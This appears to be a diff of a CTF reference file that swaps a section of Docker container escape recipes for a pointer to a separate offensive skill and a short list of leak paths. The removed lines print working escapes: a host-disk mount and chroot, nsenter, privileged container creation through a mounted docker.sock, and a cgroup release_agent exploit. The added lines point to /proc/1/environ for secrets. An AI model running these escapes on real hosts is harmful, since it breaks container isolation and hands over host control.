@@ -20,11 +20,7 @@ This reference is a debrandized preservation copy of imported CTF-skill material
   - [Step 4: ROP chain to mprotect + read + shellcode](#step-4-rop-chain-to-mprotect-read-shellcode)
   - [Step 5: Shellcode with glob for unknown flag path](#step-5-shellcode-with-glob-for-unknown-flag-path)
 - [BuildKit Daemon Exploitation for Build Secrets]
-- [Docker Container Escape Techniques](#docker-container-escape-techniques)
-  - [Privileged Container Breakout](#privileged-container-breakout)
-  - [Docker Socket Escape](#docker-socket-escape)
-  - [Capability-Based Escape (CAP_SYS_ADMIN)](#capability-based-escape-cap_sys_admin)
-  - [Container Information Leakage](#container-information-leakage)
+- [Container Information Leakage](#container-information-leakage) (escape recipes: see `container-technique`)
 - [15-Puzzle Solvability as Bit Encoder]
 - [Levenshtein Distance Oracle Attack]
 - [SECCOMP Bypass via High-Bit File Descriptor Trick]
@@ -444,63 +440,19 @@ RUN -mount=type=secret,id=flag cat /run/secrets/flag; false
 
 -
 
-## Docker Container Escape Techniques
+## Container Escape (Docker / K8s)
 
-### Privileged Container Breakout
+Escape recipes (privileged mount, docker.sock, cgroup `release_agent`, `core_pattern`, `modprobe_path`, K8s service-account / kubelet / RBAC abuse) live in `offensive-techniques/container-technique/` and its `privileged-escapes.md`. Do not duplicate them here. Load that skill when a shell reports `/.dockerenv`, `kubepods` in `/proc/self/cgroup`, or `CAP_SYS_ADMIN`.
 
-Containers started with `-privileged` have all Linux capabilities and access to host devices. Mount the host filesystem and chroot:
+### Container Information Leakage (CTF-specific)
 
-```bash
-# List host disks
-fdisk -l
-# Mount host root filesystem
-mkdir /mnt/host && mount /dev/sda1 /mnt/host
-# Chroot to host
-chroot /mnt/host /bin/bash
-# Or via nsenter (requires PID 1 on host)
-nsenter -target 1 -mount -uts -ipc -net -pid - /bin/bash
-```
+Even without escape, containers leak host info useful for misc challenges:
+- `/proc/self/cgroup` — container ID
+- `/proc/mounts` (or `/proc/self/mountinfo`) — overlayfs `upperdir` reveals host path used by `core_pattern` / `release_agent` payloads
+- `/sys/kernel/slab/*/cgroup/` — sibling container IDs (cgroup debug info)
+- `/proc/1/environ` — environment variables from container start (frequently leaks flags, tokens, or build-time secrets)
 
-### Docker Socket Escape
-
-If `/var/run/docker.sock` is mounted inside the container, create a new privileged container that mounts the host root:
-
-```bash
-# Check for socket
-ls -la /var/run/docker.sock
-# Escape: create privileged container with host root mounted
-docker run -v /:/mnt/host -rm -it alpine chroot /mnt/host /bin/bash
-# Or via API if docker CLI unavailable:
-curl -s -unix-socket /var/run/docker.sock \
-  -X POST "http://localhost/containers/create" \
-  -H "Content-Type: application/json" \
-  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/mnt"],"Privileged":true}'
-```
-
-### Capability-Based Escape (CAP_SYS_ADMIN)
-
-With `CAP_SYS_ADMIN`, exploit cgroup release_agent for host command execution:
-
-```bash
-# Create cgroup, set release_agent to host command
-mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
-mkdir /tmp/cgrp/x
-echo 1 > /tmp/cgrp/x/notify_on_release
-host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /etc/mtab)
-echo "$host_path/cmd" > /tmp/cgrp/release_agent
-echo '#!/bin/sh' > /cmd && echo 'cat /flag > /tmp/cgrp/x/flag' >> /cmd && chmod +x /cmd
-echo $$ > /tmp/cgrp/x/cgroup.procs  # Trigger release_agent
-```
-
-### Container Information Leakage
-
-Even without escape, containers leak host info:
-- `/proc/self/cgroup` - container ID
-- `/proc/mounts` - overlayfs `upperdir` reveals host path
-- `/sys/kernel/slab/*/cgroup/` - other container IDs (cgroup debug info)
-- `/proc/1/environ` - environment variables from container start
-
-**Key insight:** Check `-privileged` flag, mounted sockets (`docker.sock`), and capabilities (`capsh -print`) first. Privileged = instant escape. Socket = create new privileged container. CAP_SYS_ADMIN = cgroup release_agent. Without any of these, focus on information leakage and application-level escapes.
+**Key insight:** Triage `--privileged`, mounted sockets (`docker.sock`), and capabilities (`capsh --print`) first, then hand off to `container-technique` for the exploit. In pure-misc scoring, `/proc/1/environ` alone is often enough to lift the flag without escaping.
 
 -
 
